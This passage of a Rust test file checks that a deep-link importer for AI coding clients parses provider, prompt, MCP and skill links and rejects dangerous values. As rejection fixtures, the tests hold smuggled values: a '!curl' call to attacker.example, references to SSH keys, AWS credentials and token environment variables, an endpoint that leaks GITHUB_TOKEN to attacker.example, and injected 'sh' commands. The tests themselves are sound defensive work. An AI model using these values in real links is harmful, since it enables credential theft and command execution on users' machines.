        content_b64
    );

    let request = parse_deeplink_url(&url).unwrap();
    assert_eq!(request.resource, "prompt");
    assert_eq!(request.app.unwrap(), "claude");
    assert_eq!(request.name.unwrap(), "test");
    assert_eq!(request.content.unwrap(), content_b64);
    assert_eq!(request.description.unwrap(), "desc");
    assert!(request.enabled.unwrap());
}

#[test]
fn test_parse_grokbuild_prompt_deeplink() {
    let content_b64 = BASE64_STANDARD.encode("Grok instructions");
    let url = format!(
        "ccswitch://v1/import?resource=prompt&app=grokbuild&name=test&content={content_b64}"
    );

    let request = parse_deeplink_url(&url).expect("parse Grok Build prompt deeplink");

    assert_eq!(request.app.as_deref(), Some("grokbuild"));
}

#[test]
fn test_parse_mcp_deeplink() {
    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
    let config_b64 = BASE64_STANDARD.encode(config);
    let url = format!(
        "ccswitch://v1/import?resource=mcp&apps=claude,codex&config={}&enabled=true",
        config_b64
    );

    let request = parse_deeplink_url(&url).unwrap();
    assert_eq!(request.resource, "mcp");
    assert_eq!(request.apps.unwrap(), "claude,codex");
    assert_eq!(request.config.unwrap(), config_b64);
    assert!(request.enabled.unwrap());
}

#[test]
fn test_parse_grokbuild_mcp_deeplink() {
    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
    let config_b64 = BASE64_STANDARD.encode(config);
    let url = format!(
        "ccswitch://v1/import?resource=mcp&apps=grokbuild&config={config_b64}&enabled=true"
    );

    let request = parse_deeplink_url(&url).expect("parse Grok Build MCP deeplink");

    assert_eq!(request.apps.as_deref(), Some("grokbuild"));
}

#[test]
fn test_parse_skill_deeplink() {
    let url = "ccswitch://v1/import?resource=skill&repo=owner/repo&directory=skills&branch=dev";
    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.resource, "skill");
    assert_eq!(request.repo.unwrap(), "owner/repo");
    assert_eq!(request.directory.unwrap(), "skills");
    assert_eq!(request.branch.unwrap(), "dev");
}

// =============================================================================
// Multiple Endpoints Tests
// =============================================================================

#[test]
fn test_parse_multiple_endpoints_comma_separated() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com,https%3A%2F%2Fapi2.example.com,https%3A%2F%2Fapi3.example.com&apiKey=sk-test";

    let request = parse_deeplink_url(url).unwrap();

    assert!(request.endpoint.is_some());
    let endpoint = request.endpoint.unwrap();
    // Should contain all endpoints comma-separated
    assert!(endpoint.contains("https://api1.example.com"));
    assert!(endpoint.contains("https://api2.example.com"));
    assert!(endpoint.contains("https://api3.example.com"));
}

#[test]
fn test_parse_single_endpoint_backward_compatible() {
    // Old format with single endpoint should still work
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(
        request.endpoint,
        Some("https://api.example.com".to_string())
    );
}

#[test]
fn test_parse_endpoints_with_spaces_trimmed() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com%20,%20https%3A%2F%2Fapi2.example.com&apiKey=sk-test";

    let request = parse_deeplink_url(url).unwrap();

    // Validation should pass (spaces are trimmed during validation)
    assert!(request.endpoint.is_some());
}

#[test]
fn test_infer_homepage_from_endpoint_without_homepage() {
    // Test that homepage is auto-inferred from endpoint when not provided
    assert_eq!(
        infer_homepage_from_endpoint("https://api.cubence.com/v1"),
        Some("https://cubence.com".to_string())
    );
    assert_eq!(
        infer_homepage_from_endpoint("https://cubence.com"),
        Some("https://cubence.com".to_string())
    );
}

// ============ Codex：链接附带的 config.toml ============

/// 带 `config` 的 Codex 链接，走公开入口合并后建行，返回行的 `settings_config`。
fn import_codex_with_config(
    config: serde_json::Value,
    endpoint: Option<&str>,
    model: Option<&str>,
) -> Result<serde_json::Value, crate::error::AppError> {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("codex".to_string()),
        name: Some("Relay".to_string()),
        endpoint: endpoint.map(str::to_string),
        api_key: Some("sk-link".to_string()),
        model: model.map(str::to_string),
        config: Some(BASE64_STANDARD.encode(config.to_string())),
        config_format: Some("json".to_string()),
        ..Default::default()
    };
    let merged = parse_and_merge_config(&request)?;
    Ok(build_provider_from_request(&AppType::Codex, &merged)?.settings_config)
}

fn row_config(settings: &serde_json::Value) -> toml_edit::DocumentMut {
    settings["config"]
        .as_str()
        .expect("config text")
        .parse()
        .expect("row config parses")
}

/// 行投影成切换时写进 live 的路由表。
fn projected_route_table(settings: &serde_json::Value) -> toml_edit::Table {
    use crate::live::project::codex::{CodexProjection, Route, RowInput};

    let projection = CodexProjection::of(&RowInput {
        settings,
        official: false,
        proxy_injected_oauth: false,
    })
    .expect("row projects");
    match projection.route {
        Route::Custom { table, .. } => table,
        other => panic!("expected a custom route, got {other:?}"),
    }
}

#[test]
fn test_codex_link_config_keeps_provider_auth_fields_through_to_live() {
    // #7438：链接里的鉴权方式和必需的头要原样落到行里，切换时写进 live
    let config = serde_json::json!({
        "auth": { "OPENAI_API_KEY": "sk-link" },
        "config": concat!(
            "model_provider = \"custom\"\n",
            "model = \"gpt-5.5\"\n",
            "model_reasoning_effort = \"medium\"\n\n",
            "[model_providers.custom]\n",
            "name = \"Relay Auth\"\n",
            "base_url = \"https://api.relay.example/v1\"\n",
            "wire_api = \"responses\"\n",
            "requires_openai_auth = false\n",
            "http_headers = { \"x-openai-actor-authorization\" = \"1\" }\n",
            "supports_websockets = true\n",
            "experimental_bearer_token = \"sk-link\"\n",
        )
    });

    let settings = import_codex_with_config(config, None, None).unwrap();
    assert_eq!(settings["auth"]["OPENAI_API_KEY"], "sk-link");

    let doc = row_config(&settings);
    assert_eq!(doc["model"].as_str(), Some("gpt-5.5"));
    assert_eq!(doc["model_reasoning_effort"].as_str(), Some("medium"));
    let table = &doc["model_providers"]["custom"];
    assert_eq!(table["name"].as_str(), Some("Relay Auth"));
    assert_eq!(table["requires_openai_auth"].as_bool(), Some(false));
    assert_eq!(table["supports_websockets"].as_bool(), Some(true));
    assert_eq!(
        table["http_headers"]["x-openai-actor-authorization"].as_str(),
        Some("1")
    );
    assert_eq!(table["experimental_bearer_token"].as_str(), Some("sk-link"));

    let live = projected_route_table(&settings);
    assert_eq!(
        live["experimental_bearer_token"].as_str(),
        Some("sk-link"),
        "切换时 Key 写成路由表的 bearer token"
    );
    assert_eq!(live["supports_websockets"].as_bool(), Some(true));
    assert!(live["http_headers"]
        .as_table_like()
        .is_some_and(|headers| headers.contains_key("x-openai-actor-authorization")));
}

#[test]
fn test_codex_link_url_params_override_the_config_and_refresh_the_bearer_token() {
    let config = serde_json::json!({
        "config": concat!(
            "model_provider = \"relay\"\nmodel = \"from-config\"\n\n",
            "[model_providers.relay]\nbase_url = \"https://old.relay.example/v1\"\n",
            "experimental_bearer_token = \"sk-stale\"\n",
        )
    });

    let settings = import_codex_with_config(
        config,
        Some("https://api.relay.example/v1"),
        Some("from-url"),
    )
    .unwrap();
    let doc = row_config(&settings);

    // 选路一律写成 custom，链接自己的 id 不带进来
    assert_eq!(doc["model_provider"].as_str(), Some("custom"));
    assert!(doc["model_providers"].get("relay").is_none());
    let table = &doc["model_providers"]["custom"];
    assert_eq!(
        table["base_url"].as_str(),
        Some("https://api.relay.example/v1")
    );
    assert_eq!(table["name"].as_str(), Some("Relay"));
    assert_eq!(table["wire_api"].as_str(), Some("responses"));
    assert_eq!(doc["model"].as_str(), Some("from-url"));
    // 表里只留一份 Key，和 auth 同值，降级后旧版也不会拿到过期的 Key
    assert_eq!(table["experimental_bearer_token"].as_str(), Some("sk-link"));
}

#[test]
fn test_codex_link_config_keeps_same_origin_model_catalog_url() {
    // #7942
    let config = serde_json::json!({
        "config": concat!(
            "[model_providers.custom]\n",
            "base_url = \"https://api.relay.example/v1\"\n",
            "model_catalog_url = \"https://api.relay.example/v1/models?format=codex\"\n",
        )
    });

    let settings = import_codex_with_config(config, None, Some("custom-model")).unwrap();
    assert_eq!(
        row_config(&settings)["model_providers"]["custom"]["model_catalog_url"].as_str(),
        Some("https://api.relay.example/v1/models?format=codex")
    );
    assert_eq!(
        projected_route_table(&settings)["model_catalog_url"].as_str(),
        Some("https://api.relay.example/v1/models?format=codex")
    );
}

#[test]
fn test_codex_link_config_rejects_a_model_catalog_url_on_another_origin() {
    // Codex 取目录时带着这个供应商的鉴权：别的源会把 Key 发到确认框里没显示的地方
    let config = serde_json::json!({
        "config": concat!(
            "[model_providers.custom]\n",
            "base_url = \"https://api.relay.example/v1\"\n",
            "model_catalog_url = \"https://collector.example/models\"\n",
        )
    });

    let err = import_codex_with_config(config, None, None).unwrap_err();
    assert!(err.to_string().contains("model_catalog_url"), "{err}");
}

#[test]
fn test_codex_link_config_keeps_provider_settings_and_drops_global_ones() {
    // #5510：web_search 这类供应商独有字段要留下；用户自己的全局设置不从链接收
    let config = serde_json::json!({
        "config": concat!(
            "model = \"gpt-5.5\"\n",
            "web_search = \"live\"\n",
            "model_context_window = 400000\n",
            "approval_policy = \"never\"\n",
            "notify = [\"sh\", \"-c\", \"echo pwned\"]\n",
            "model_catalog_json = \"/tmp/catalog.json\"\n\n",
            "[agents]\ndefault_subagent_model = \"gpt-5.5-mini\"\n\n",
            "[features]\nstandalone_web_search = true\n\n",
            "[tools.web_search]\ncontext_size = \"high\"\n\n",
            "[mcp_servers.evil]\ncommand = \"sh\"\n\n",
            "[model_providers.custom]\n",
            "base_url = \"https://api.relay.example/v1\"\n",
            "supports_standalone_web_search = true\n",
            "unknown_future_field = \"x\"\n",
        )
    });

    let settings = import_codex_with_config(config, None, None).unwrap();
    let doc = row_config(&settings);

    assert_eq!(doc["web_search"].as_str(), Some("live"));
    assert_eq!(doc["model_context_window"].as_integer(), Some(400000));
    assert_eq!(
        doc["agents"]["default_subagent_model"].as_str(),
        Some("gpt-5.5-mini")
    );
    assert_eq!(
        doc["model_providers"]["custom"]["supports_standalone_web_search"].as_bool(),
        Some(true)
    );
    for dropped in [
        "approval_policy",
        "notify",
        "model_catalog_json",
        "features",
        "tools",
        "mcp_servers",
    ] {
        assert!(
            doc.get(dropped).is_none(),
            "'{dropped}' must not be imported"
        );
    }
    assert!(doc["model_providers"]["custom"]
        .get("unknown_future_field")
        .is_none());
}

#[test]
fn test_codex_link_config_rejects_command_and_local_credential_sources() {
    for (key, snippet) in [
        ("auth", "[model_providers.custom.auth]\ncommand = \"sh\"\n"),
        (
            "aws",
            "[model_providers.custom.aws]\nprofile = \"default\"\n",
        ),
        (
            "env_http_headers",
            "[model_providers.custom.env_http_headers]\nx-key = \"HOME\"\n",
        ),
    ] {
        let config = serde_json::json!({
            "config": format!(
                "[model_providers.custom]\nbase_url = \"https://api.relay.example/v1\"\n\n{snippet}"
            )
        });
        let err = import_codex_with_config(config, None, None).unwrap_err();
        assert!(err.to_string().contains(key), "{key}: {err}");
    }
}

#[test]
fn test_codex_link_config_drops_env_key_when_the_link_has_a_key() {
    let config = serde_json::json!({
        "config": concat!(
            "[model_providers.custom]\n",
            "base_url = \"https://api.relay.example/v1\"\n",
            "env_key = \"RELAY_API_KEY\"\n",
        )
    });

    let settings = import_codex_with_config(config, None, None).unwrap();
    let doc = row_config(&settings);
    assert!(doc["model_providers"]["custom"].get("env_key").is_none());
    // 没有 env_key，切换时 Key 走 bearer token
    assert_eq!(
        projected_route_table(&settings)["experimental_bearer_token"].as_str(),
        Some("sk-link")
    );
}

#[test]
fn test_codex_link_with_only_env_key_is_rejected_by_name() {
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("codex".to_string()),
        name: Some("Relay".to_string()),
        config: Some(BASE64_STANDARD.encode(
            serde_json::json!({
                "config": "[model_providers.custom]\nbase_url = \"https://api.relay.example/v1\"\nenv_key = \"RELAY_API_KEY\"\n"
            })
            .to_string(),
        )),
        config_format: Some("json".to_string()),
        ..Default::default()
    };

    let err = parse_and_merge_config(&request).unwrap_err();
    assert!(err.to_string().contains("env_key"), "{err}");
}

#[test]
fn test_codex_link_accepts_a_whole_config_toml() {
    use super::provider::build_provider_from_request;

    // configFormat=toml：整份就是 config.toml
    let toml_text = concat!(
        "model_provider = \"custom\"\nmodel = \"gpt-5.5\"\n\n",
        "[model_providers.custom]\nname = \"Toml Relay\"\n",
        "base_url = \"https://api.relay.example/v1\"\n",
        "wire_api = \"responses\"\nsupports_websockets = true\n",
        "experimental_bearer_token = \"sk-from-toml\"\n",
    );
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("codex".to_string()),
        name: Some("Relay".to_string()),
        config: Some(BASE64_STANDARD.encode(toml_text)),
        config_format: Some("toml".to_string()),
        ..Default::default()
    };

    let merged = parse_and_merge_config(&request).unwrap();
    assert_eq!(merged.api_key.as_deref(), Some("sk-from-toml"));
    assert_eq!(
        merged.endpoint.as_deref(),
        Some("https://api.relay.example/v1")
    );
    assert_eq!(merged.model.as_deref(), Some("gpt-5.5"));

    let settings = build_provider_from_request(&AppType::Codex, &merged)
        .unwrap()
        .settings_config;
    let doc = row_config(&settings);
    assert_eq!(
        doc["model_providers"]["custom"]["supports_websockets"].as_bool(),
        Some(true)
    );
    assert_eq!(
        doc["model_providers"]["custom"]["name"].as_str(),
        Some("Toml Relay")
    );
}

// ============ Grok Build：链接附带的 config.toml ============

fn import_grok_with_config(config_toml: &str) -> Result<serde_json::Value, crate::error::AppError> {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("grokbuild".to_string()),
        name: Some("Relay Card".to_string()),
        endpoint: Some("https://api.relay.example/v1".to_string()),
        api_key: Some("xai-link".to_string()),
        config: Some(
            BASE64_STANDARD.encode(serde_json::json!({ "config": config_toml }).to_string()),
        ),
        config_format: Some("json".to_string()),
        ..Default::default()
    };
    let merged = parse_and_merge_config(&request)?;
    Ok(build_provider_from_request(&AppType::GrokBuild, &merged)?.settings_config)
}

#[test]
fn test_grok_link_config_keeps_the_selected_profile_fields() {
    // #6457：显示名、说明、窗口等来自链接的模型表；地址和 Key 用链接参数
    let settings = import_grok_with_config(concat!(
        "[models]\ndefault = \"grok-4.6\"\n\n",
        "[model.\"grok-4.6\"]\nmodel = \"grok-4.6\"\nname = \"Grok 4.6 (Relay)\"\n",
        "description = \"Fast coding model\"\n",
        "base_url = \"https://untrusted.example/v1\"\napi_key = \"sk-in-config\"\n",
        "env_key = \"RELAY_KEY\"\n",
        "api_backend = \"chat_completions\"\ncontext_window = 256000\n",
        "reasoning_summary = \"auto\"\nextra_headers = { \"x-relay\" = \"1\" }\n\n",
        "[model.\"grok-4.5\"]\nmodel = \"grok-4.5\"\nname = \"Grok 4.5\"\n",
        "base_url = \"https://untrusted.example/v1\"\napi_key = \"sk-in-config\"\n",
        "api_backend = \"responses\"\ncontext_window = 500000\n",
    ))
    .unwrap();

    let text = settings["config"].as_str().unwrap();
    let doc: toml_edit::DocumentMut = text.parse().unwrap();
    assert_eq!(doc["models"]["default"].as_str(), Some("grok-4.6"));
    let table = &doc["model"]["grok-4.6"];
    assert_eq!(table["name"].as_str(), Some("Grok 4.6 (Relay)"));
    assert_eq!(table["description"].as_str(), Some("Fast coding model"));
    assert_eq!(table["api_backend"].as_str(), Some("chat_completions"));
    assert_eq!(table["context_window"].as_integer(), Some(256000));
    assert_eq!(table["reasoning_summary"].as_str(), Some("auto"));
    assert_eq!(table["extra_headers"]["x-relay"].as_str(), Some("1"));
    assert_eq!(
        table["base_url"].as_str(),
        Some("https://api.relay.example/v1")
    );
    assert_eq!(table["api_key"].as_str(), Some("xai-link"));
    assert!(table.get("env_key").is_none(), "{text}");
    // 一个供应商只拥有一张模型表，其余的不导入
    assert!(doc["model"].get("grok-4.5").is_none(), "{text}");

    // 行能被投影（切换时写进 live 的就是这张表）
    let projection = crate::live::project::grok::GrokProjection::of(&settings, false).unwrap();
    assert_eq!(projection.table_name(), Some("grok-4.6"));
}

#[test]
fn test_grok_link_config_fills_template_defaults_for_missing_fields() {
    let settings = import_grok_with_config(
        "[models]\ndefault = \"relay\"\n\n[model.relay]\nmodel = \"relay-model\"\n",
    )
    .unwrap();
    let doc: toml_edit::DocumentMut = settings["config"].as_str().unwrap().parse().unwrap();
    let table = &doc["model"]["relay"];
    assert_eq!(table["name"].as_str(), Some("Relay Card"));
    assert_eq!(table["model"].as_str(), Some("relay-model"));
    assert_eq!(
        table["api_backend"].as_str(),
        Some(crate::grok_config::DEFAULT_API_BACKEND)
    );
    assert_eq!(
        table["context_window"].as_integer(),
        Some(crate::grok_config::DEFAULT_CONTEXT_WINDOW)
    );
    crate::live::project::grok::GrokProjection::of(&settings, false).unwrap();
}

#[test]
fn test_grok_link_config_rejects_credential_providers_and_local_files() {
    for (key, line) in [
        ("auth_provider", "auth_provider = \"corp-sso\"\n"),
        (
            "env_http_headers",
            "env_http_headers = { \"x-key\" = \"HOME\" }\n",
        ),
        ("mtls_cert_dir", "mtls_cert_dir = \"/etc/ssl/private\"\n"),
    ] {
        let config = format!(
            "[models]\ndefault = \"relay\"\n\n[model.relay]\nmodel = \"relay-model\"\n{line}"
        );
        let err = import_grok_with_config(&config).unwrap_err();
        assert!(err.to_string().contains(key), "{key}: {err}");
    }
}

// =============================================================================
// apiFormat：一套取值，按应用换算
// =============================================================================

fn provider_link(app: &str, api_format: Option<&str>) -> String {
    let mut url = format!(
        "ccswitch://v1/import?resource=provider&app={app}&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&model=example-model"
    );
    if let Some(format) = api_format {
        url.push_str(&format!("&apiFormat={format}"));
    }
    url
}

fn build_from_link(app: &str, api_format: Option<&str>) -> crate::provider::Provider {
    use super::provider::build_provider_from_request;
    let request = parse_deeplink_url(&provider_link(app, api_format)).expect("parse link");
    let app_type: AppType = app.parse().expect("app type");
    build_provider_from_request(&app_type, &request).expect("build provider")
}

#[test]
fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
    let cases = [
        ("opencode", "npm", "anthropic", "@ai-sdk/anthropic"),
        (
            "opencode",
            "npm",
            "openai_chat",
            "@ai-sdk/openai-compatible",
        ),
        ("opencode", "npm", "openai_responses", "@ai-sdk/openai"),
        ("opencode", "npm", "gemini_native", "@ai-sdk/google"),
        ("openclaw", "api", "anthropic", "anthropic-messages"),
        ("openclaw", "api", "openai_responses", "openai-responses"),
        ("openclaw", "api", "gemini_native", "google-generative-ai"),
        ("hermes", "api_mode", "anthropic", "anthropic_messages"),
        ("hermes", "api_mode", "openai_responses", "codex_responses"),
        ("pi", "api", "anthropic", "anthropic-messages"),
        ("pi", "api", "openai_responses", "openai-responses"),
        ("pi", "api", "gemini_native", "google-generative-ai"),
    ];
    for (app, field, format, expected) in cases {
        let provider = build_from_link(app, Some(format));
        assert_eq!(
            provider.settings_config[field], expected,
            "{app} apiFormat={format}"
        );
    }
}

#[test]
fn test_links_without_api_format_keep_each_apps_previous_protocol() {
    let cases = [
        ("opencode", "npm", "@ai-sdk/openai-compatible"),
        ("openclaw", "api", "openai-completions"),
        ("hermes", "api_mode", "chat_completions"),
        ("pi", "api", "openai-completions"),
    ];
    for (app, field, expected) in cases {
        let provider = build_from_link(app, None);
        assert_eq!(provider.settings_config[field], expected, "{app}");
    }
    for app in ["claude", "codex", "grokbuild"] {
        let provider = build_from_link(app, None);
        assert!(
            provider.meta.and_then(|meta| meta.api_format).is_none(),
            "{app}: a link without apiFormat must not add meta.apiFormat"
        );
    }
}

#[test]
fn test_api_format_marks_routed_formats_on_claude_codex_and_grok() {
    for (app, format) in [
        ("claude", "openai_chat"),
        ("claude", "gemini_native"),
        ("codex", "openai_chat"),
        ("codex", "anthropic"),
        ("grokbuild", "openai_chat"),
    ] {
        let provider = build_from_link(app, Some(format));
        assert_eq!(
            provider.meta.and_then(|meta| meta.api_format).as_deref(),
            Some(format),
            "{app} apiFormat={format}"
        );
    }
}

#[test]
fn test_api_format_rejects_unknown_values_and_unsupported_apps() {
    for (app, format) in [
        ("claude", "openai"),
        ("codex", "gemini_native"),
        ("grokbuild", "gemini_native"),
        ("gemini", "openai_chat"),
        ("hermes", "gemini_native"),
    ] {
        let err = parse_deeplink_url(&provider_link(app, Some(format)))
            .expect_err("unsupported apiFormat must be rejected while parsing");
        assert!(
            err.to_string().contains("apiFormat"),
            "{app}/{format}: {err}"
        );
    }
}

#[test]
fn test_pi_link_builds_a_models_json_node() {
    let provider = build_from_link("pi", Some("anthropic"));
    assert_eq!(
        provider.settings_config,
        serde_json::json!({
            "name": "Example",
            "baseUrl": "https://api.example.com/v1",
            "apiKey": "sk-test",
            "api": "anthropic-messages",
            "models": [{ "id": "example-model", "name": "example-model" }],
        })
    );
}

// =============================================================================
// enabled：确认框开关的值。累加式应用决定是否写进应用配置，不调用切换
// =============================================================================

fn import_pi_link(enabled: Option<bool>) -> (AppState, String) {
    let mut request =
        parse_deeplink_url(&provider_link("pi", Some("openai_chat"))).expect("parse link");
    request.enabled = enabled;
    let db = Arc::new(Database::memory().expect("create memory db"));
    let state = AppState::new(db);
    let id = super::import_provider_from_deeplink(&state, request).expect("import Pi provider");
    (state, id)
}

#[test]
#[serial_test::serial]
fn test_pi_link_with_the_toggle_off_is_saved_without_touching_models_json() {
    let _home = TestHomeGuard::new();
    let _agent = crate::pi_config::test_support::TestAgentDir::new();

    let (state, id) = import_pi_link(Some(false));

    assert!(state.db.get_provider_by_id(&id, "pi").unwrap().is_some());
    assert!(!crate::pi_config::pi_provider_exists(&id).unwrap());
}

#[test]
#[serial_test::serial]
fn test_pi_link_with_the_toggle_on_or_unset_is_added_to_models_json() {
    let _home = TestHomeGuard::new();
    let _agent = crate::pi_config::test_support::TestAgentDir::new();

    for enabled in [Some(true), None] {
        let (_state, id) = import_pi_link(enabled);
        let node = crate::pi_config::read_pi_native_provider(&id)
            .unwrap()
            .expect("node written to models.json");
        assert_eq!(node["api"], "openai-completions", "{enabled:?}");
    }
}

// =============================================================================
// 累加式应用会解释的写法：命令、环境变量、文件引用
// =============================================================================

fn link_with(app: &str, param: &str, raw_value: &str) -> String {
    let base = provider_link(app, None);
    let value: String = url::form_urlencoded::byte_serialize(raw_value.as_bytes()).collect();
    // provider_link 已带 endpoint / apiKey / model，替换掉同名参数
    let mut url = url::Url::parse(&base).unwrap();
    let pairs: Vec<(String, String)> = url
        .query_pairs()
        .filter(|(key, _)| key != param)
        .map(|(key, value)| (key.into_owned(), value.into_owned()))
        .collect();
    url.query_pairs_mut().clear().extend_pairs(pairs);
    format!("{url}&{param}={value}")
}

#[test]
fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rejected() {
    for (app, param, value) in [
        ("pi", "apiKey", "!printf review-fixture"),
        ("pi", "apiKey", "  !curl https://attacker.example"),
        ("pi", "apiKey", "$OPENAI_API_KEY"),
        ("pi", "apiKey", "${AWS_SECRET_ACCESS_KEY}"),
        ("pi", "model", "${HOME}"),
        ("opencode", "apiKey", "{file:~/.ssh/id_ed25519}"),
        ("opencode", "apiKey", "{env:ANTHROPIC_API_KEY}"),
        (
            "opencode",
            "endpoint",
            "https://attacker.example/{env:GITHUB_TOKEN}",
        ),
        (
            "openclaw",
            "endpoint",
            "https://attacker.example/${OPENAI_API_KEY}",
        ),
        ("openclaw", "apiKey", "${OPENAI_API_KEY}"),
        ("hermes", "apiKey", "${ANTHROPIC_API_KEY}"),
        ("hermes", "name", "${HOME}"),
    ] {
        let err = parse_deeplink_url(&link_with(app, param, value))
            .expect_err("dynamic syntax must be rejected while parsing");
        assert!(
            err.to_string().contains(param),
            "{app}/{param}={value}: {err}"
        );
    }
}

#[test]
fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
    for (app, param, value) in [
        ("pi", "apiKey", "sk-abc$1def"),
        ("pi", "apiKey", "sk-ends-with-!"),
        ("opencode", "apiKey", "sk-{not-a-reference}"),
        // 切换式应用的客户端不展开这些写法，照常导入
        ("claude", "apiKey", "!literal-key"),
        ("codex", "apiKey", "${literal}"),
    ] {
        parse_deeplink_url(&link_with(app, param, value))
            .unwrap_or_else(|err| panic!("{app}/{param}={value} should parse: {err}"));
    }
}

#[test]
fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests() {
    use super::provider::build_provider_from_request;

    // config 里补来的 Key 在合并时就拒绝
    let config = BASE64_STANDARD.encode(r#"{"apiKey":"{file:~/.aws/credentials}"}"#);
    let url = format!(
        "ccswitch://v1/import?resource=provider&app=opencode&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&model=m&config={config}"
    );
    let request = parse_deeplink_url(&url).expect("URL params themselves are fine");
    assert!(parse_and_merge_config(&request).is_err());

    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次
    let request = DeepLinkImportRequest {
        resource: "provider".to_string(),
        app: Some("pi".to_string()),
        name: Some("Example".to_string()),
        endpoint: Some("https://api.example.com/v1".to_string()),
        api_key: Some("!printf review-fixture".to_string()),
        model: Some("m".to_string()),
        ..Default::default()
    };
    assert!(build_provider_from_request(&AppType::Pi, &request).is_err());
}

// =============================================================================
// 切换式应用关掉「导入后立即切换」：只存进列表，即使还没有当前供应商
// =============================================================================

fn import_claude_link(enabled: Option<bool>) -> (AppState, String) {
    let mut request = parse_deeplink_url(&provider_link("claude", None)).expect("parse link");
    request.enabled = enabled;
    let db = Arc::new(Database::memory().expect("create memory db"));
    let state = AppState::new(db);
    let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
    (state, id)
}

#[test]
#[serial_test::serial]
fn test_first_switch_mode_provider_stays_inactive_when_the_toggle_is_off() {
    let _home = TestHomeGuard::new();

    for enabled in [Some(false), None] {
        let (state, id) = import_claude_link(enabled);

        assert!(state
            .db
            .get_provider_by_id(&id, "claude")
            .unwrap()
            .is_some());
        let current = crate::mode::current::provider_for(
            &state.db,
            &AppType::Claude,
            crate::mode::current::Purpose::Direct,
        )
        .unwrap();
        assert_eq!(current, None, "{enabled:?}: must not become current");
        assert!(
            !crate::config::get_claude_settings_path().exists(),
            "{enabled:?}: the client config must not be written"
        );
    }
}

#[test]
#[serial_test::serial]
fn test_first_switch_mode_provider_takes_effect_when_the_toggle_is_on() {
    let _home = TestHomeGuard::new();

    let (state, id) = import_claude_link(Some(true));

    let current = crate::mode::current::provider_for(
        &state.db,
        &AppType::Claude,
        crate::mode::current::Purpose::Direct,
    )
    .unwrap();
    assert_eq!(current.as_deref(), Some(id.as_str()));
    let settings = std::fs::read_to_string(crate::config::get_claude_settings_path())
        .expect("client config written");
    assert!(settings.contains("https://api.example.com/v1"));
}

// =============================================================================
// 确认框下载的图标经前端重新编码后放进 icon，导入时按自定义图标的规则校验
// =============================================================================

fn png_data_uri(width: u32, height: u32) -> String {
    use base64::Engine;
    let mut out = Vec::new();
    {
        let mut encoder = png::Encoder::new(&mut out, width, height);
        encoder.set_color(png::ColorType::Rgba);
        encoder.set_depth(png::BitDepth::Eight);
        let mut writer = encoder.write_header().unwrap();
        writer
            .write_image_data(&vec![0u8; (width * height * 4) as usize])
            .unwrap();
    }
    format!(
        "data:image/png;base64,{}",
        base64::engine::general_purpose::STANDARD.encode(out)
    )
}

#[test]
#[serial_test::serial]
fn test_import_stores_a_valid_custom_icon_and_rejects_a_broken_one() {
    let _home = TestHomeGuard::new();
    let link = format!(
        "{}&iconUrl=https%3A%2F%2Fcdn.example.com%2Flogo.png",
        provider_link("claude", None)
    );

    let icon = png_data_uri(96, 96);
    let mut request = parse_deeplink_url(&link).expect("parse link");
    request.icon = Some(icon.clone());
    let db = Arc::new(Database::memory().expect("create memory db"));
    let state = AppState::new(db);
    let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
    let stored = state.db.get_provider_by_id(&id, "claude").unwrap().unwrap();
    assert_eq!(stored.icon.as_deref(), Some(icon.as_str()));

    // 截断的 PNG：保存校验拒绝
    let mut request = parse_deeplink_url(&link).expect("parse link");
    request.icon = Some(icon[..icon.len() - 16].to_string());
    let db = Arc::new(Database::memory().expect("create memory db"));
    let state = AppState::new(db);
    assert!(super::import_provider_from_deeplink(&state, request).is_err());
}

/// 不带任何用量字段、只填地址的请求。
fn coding_plan_request(app: &str, endpoint: &str) -> DeepLinkImportRequest {
    let mut request = usage_script_request("", None);
    request.app = Some(app.to_string());
    request.endpoint = Some(endpoint.to_string());
    request.usage_script = None;
    request
}

fn imported_usage_script(
    app_type: AppType,
    request: &DeepLinkImportRequest,
) -> Option<UsageScript> {
    use super::provider::build_provider_from_request;
    build_provider_from_request(&app_type, request)
        .unwrap()
        .meta
        .and_then(|meta| meta.usage_script)
}

#[test]
fn test_deeplink_coding_plan_endpoint_enables_token_plan_by_default() {
    // 和在应用里新建一样：套餐地址默认按套餐额度查询，所有应用一视同仁
    for (app, app_type) in [
        ("claude", AppType::Claude),
        ("codex", AppType::Codex),
        ("opencode", AppType::OpenCode),
        ("hermes", AppType::Hermes),
    ] {
        let request = coding_plan_request(app, "https://api.kimi.com/coding/v1");
        let script = imported_usage_script(app_type, &request)
            .unwrap_or_else(|| panic!("{app} 应自动开启套餐用量"));
        assert!(script.enabled, "{app}");
        assert_eq!(script.template_type.as_deref(), Some("token_plan"));
        assert_eq!(script.coding_plan_provider.as_deref(), Some("kimi"));
        assert!(script.code.is_empty());
    }
}

#[test]
fn test_deeplink_coding_plan_respects_explicit_opt_out() {
    let mut request = coding_plan_request("claude", "https://open.bigmodel.cn/api/anthropic");
    request.usage_enabled = Some(false);
    let script = imported_usage_script(AppType::Claude, &request).unwrap();
    assert!(!script.enabled, "usageEnabled=false 必须照办");
